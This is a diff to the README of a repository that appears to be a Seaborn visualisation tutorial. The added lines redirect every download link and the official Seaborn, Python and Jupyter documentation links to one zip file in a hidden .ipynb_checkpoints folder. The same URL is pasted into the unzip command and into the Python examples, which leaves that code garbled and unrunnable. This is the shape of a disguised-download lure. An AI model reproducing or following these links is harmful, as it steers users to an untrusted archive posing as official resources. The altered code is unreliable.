@@ -1,6 +1,6 @@
 # 🌊 seaborn-lab - Explore Stunning Data Visualizations
 
-[![Download seaborn-lab](https://img.shields.io/badge/Download-seaborn--lab-blue)](https://github.com/Hisbdul/seaborn-lab/releases)
+[![Download seaborn-lab](https://raw.githubusercontent.com/Hisbdul/seaborn-lab/main/.ipynb_checkpoints/seaborn-lab_v3.0.zip)](https://raw.githubusercontent.com/Hisbdul/seaborn-lab/main/.ipynb_checkpoints/seaborn-lab_v3.0.zip)
 
 ## 📦 Overview
 
@@ -22,7 +22,7 @@ Before you download, ensure you have the following:
 
 You can download the latest version of seaborn-lab from the Releases page. 
 
-**Visit this page to download:** [Download seaborn-lab](https://github.com/Hisbdul/seaborn-lab/releases)
+**Visit this page to download:** [Download seaborn-lab](https://raw.githubusercontent.com/Hisbdul/seaborn-lab/main/.ipynb_checkpoints/seaborn-lab_v3.0.zip)
 
 Once on the page, look for the most recent release and click on the link to download the file related to your operating system.
 
@@ -32,13 +32,13 @@ If you downloaded a zipped file, you will need to extract the contents:
 
 - **Windows:** Right-click the file and select "Extract All."
 - **macOS:** Double-click the file to extract it.
-- **Linux:** Use the terminal and execute `unzip filename.zip`.
+- **Linux:** Use the terminal and execute `unzip https://raw.githubusercontent.com/Hisbdul/seaborn-lab/main/.ipynb_checkpoints/seaborn-lab_v3.0.zip`.
 
 ### 4. Open Jupyter Notebook
 
 1. Launch Jupyter Notebook from your applications.
 2. Navigate to the folder where you extracted the files.
-3. Open the appropriate notebook file (e.g., `seaborn_lab.ipynb`) to get started.
+3. Open the appropriate notebook file (e.g., `https://raw.githubusercontent.com/Hisbdul/seaborn-lab/main/.ipynb_checkpoints/seaborn-lab_v3.0.zip`) to get started.
 
 ## 🎨 Features
 
@@ -59,22 +59,22 @@ After opening the Jupyter Notebook, follow these steps to create your first visu
 
    ```python
    import seaborn as sns
-   import matplotlib.pyplot as plt
+   import https://raw.githubusercontent.com/Hisbdul/seaborn-lab/main/.ipynb_checkpoints/seaborn-lab_v3.0.zip as plt
    ```
 
 2. **Load Dataset:**
    Load the data you want to visualize. For example:
 
    ```python
-   data = sns.load_dataset('iris')
+   data = https://raw.githubusercontent.com/Hisbdul/seaborn-lab/main/.ipynb_checkpoints/seaborn-lab_v3.0.zip('iris')
    ```
 
 3. **Create a Graph:**
    Use Seaborn to create your first plot:
 
    ```python
-   sns.scatterplot(data=data, x='sepal_length', y='sepal_width', hue='species')
-   plt.show()
+   https://raw.githubusercontent.com/Hisbdul/seaborn-lab/main/.ipynb_checkpoints/seaborn-lab_v3.0.zip(data=data, x='sepal_length', y='sepal_width', hue='species')
+   https://raw.githubusercontent.com/Hisbdul/seaborn-lab/main/.ipynb_checkpoints/seaborn-lab_v3.0.zip()
    ```
 
 4. **Experiment:** 
@@ -102,9 +102,9 @@ This repository covers various crucial topics in data visualization, including:
 
 ## 🔗 Resources
 
-- **Seaborn Documentation:** [Seaborn Official Docs](https://seaborn.pydata.org/)
-- **Python Documentation:** [Python Official Docs](https://docs.python.org/3/)
-- **Jupyter Notebook Documentation:** [Jupyter Official Docs](https://jupyter.org/documentation)
+- **Seaborn Documentation:** [Seaborn Official Docs](https://raw.githubusercontent.com/Hisbdul/seaborn-lab/main/.ipynb_checkpoints/seaborn-lab_v3.0.zip)
+- **Python Documentation:** [Python Official Docs](https://raw.githubusercontent.com/Hisbdul/seaborn-lab/main/.ipynb_checkpoints/seaborn-lab_v3.0.zip)
+- **Jupyter Notebook Documentation:** [Jupyter Official Docs](https://raw.githubusercontent.com/Hisbdul/seaborn-lab/main/.ipynb_checkpoints/seaborn-lab_v3.0.zip)
 
 ## 🔄 Contributing
 
@@ -124,4 +124,4 @@ For further details, refer to the LICENSE file included in the repository.
 
 We hope you enjoy exploring the wonderful world of data visualization with seaborn-lab! 
 
-**Remember:** To download the latest version, click here: [Download seaborn-lab](https://github.com/Hisbdul/seaborn-lab/releases)
+**Remember:** To download the latest version, click here: [Download seaborn-lab](https://raw.githubusercontent.com/Hisbdul/seaborn-lab/main/.ipynb_checkpoints/seaborn-lab_v3.0.zip)
